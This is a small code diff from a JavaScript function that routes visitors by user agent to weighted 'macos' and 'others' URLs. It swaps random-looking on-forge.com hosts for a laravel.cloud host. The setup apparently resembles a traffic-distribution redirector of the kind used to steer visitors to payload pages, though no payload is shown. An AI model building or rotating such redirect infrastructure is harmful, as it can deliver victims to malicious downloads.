@@ -46,14 +46,14 @@ function getResponse(userAgent) {
         {
             id: "Group 1",
             weight: 0.5,
-            macos: "https://kjlhugytffdghjkj.on-forge.com/",
-            others: "https://kjlhugytffdghjkj.on-forge.com/"
+            macos: "https://laravel-nawqee-refkkp.laravel.cloud/",
+            others: "https://laravel-nawqee-refkkp.laravel.cloud/"
         },
         {
             id: "Group 2",
             weight: 0.5,
-            macos: "https://kjlhugytffdghjkj.on-forge.com/",
-            others: "https://kjlhugytffdghjkj.on-forge.com/"
+            macos: "https://laravel-nawqee-refkkp.laravel.cloud/",
+            others: "https://laravel-nawqee-refkkp.laravel.cloud/"
         }
     ];
 
